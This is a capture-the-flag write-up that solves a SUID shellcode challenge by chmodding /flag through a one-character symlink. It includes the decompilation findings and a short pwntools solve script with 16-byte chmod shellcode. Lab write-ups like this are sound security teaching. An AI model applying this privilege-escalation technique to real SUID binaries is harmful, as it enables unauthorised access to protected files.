# Shellcode3 writeup

Author: `misi`

---
In this challenge we are given a shell. The flag file is located at /flag, and the challenge binary is in /challenge. By running `ls -la /flag /challenge/shellcode`, we can see the privileges of each file.

<img width="557" height="123" alt="2" src="https://github.com/user-attachments/assets/4da74245-4adf-4055-9cea-75b054c1c8e0" />

Both /flag and /challenge/shellcode are owned by the user `owner`.  
Our current user (`ctf`) does not have permission to read /flag.  
However, the binary /challenge/shellcode has the SUID bit set, which means it runs with the privileges of its owner (owner). This allows us to potentially use it to access /flag.

### Reversing
Start by doing a checksec on the given binary to see what security features is enabled.

<img width="605" height="138" alt="1" src="https://github.com/user-attachments/assets/d03914c1-5411-46a0-af61-8f3f0bc3632f" />

- PIE is enabled
- There is no stack canary found
- The binary is not stripped
- NX enabled

I use ghidra to decompile the given binary  
main() is the only function we need to reverse.  

<img width="704" height="756" alt="3" src="https://github.com/user-attachments/assets/3dfa6d68-c3f2-4e60-b2fe-2ba654547fa0" />

main() will print out some information, do a mmap, making some memory region executable, and then read in 0x10 (16 in decimal) bytes into the memory region. Finally it will execute the input you sent in, before it returns.


### Exploitation
Since the shellcode can be at most be 16 bytes long, it is not be possible to open and read the flag directly with shellcode.

<img width="657" height="152" alt="4" src="https://github.com/user-attachments/assets/09e0f660-dc72-4c87-afc4-7ffa7a5db6b4" />

By reading at the assembly code executed before your shellcode runs, you will see that rsi will hold 0x1ed (0o755 in octal). Saving us a few bytes in the shellcode if we want execute syscalls such as chmod.  
Because there are so few bytes available, it will not be possible to run chmod on "/flag", since the filename is too long. However, you do have enough bytes to run chmod on a file with a one-character name.  
By creating a symbolic link to /flag with a single character name such as "x" (`ln -s /flag x`), makes it possible to run chmod on the symlink, which will change the permissions of /flag.  
After executing the shellcode, you can run `cat /flag` to print the flag to the terminal.  

Here is the final solve script:  
```py
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process("/challenge/shellcode")

asm_code = asm ("""
        mov eax, 90
        lea rdi, [rip + flag]
        syscall
        flag:
        .string "x"
        """)

# print(len(asm_code))

p.recvuntil("shellcode: ")
p.sendline(asm_code)
p.interactive()
```

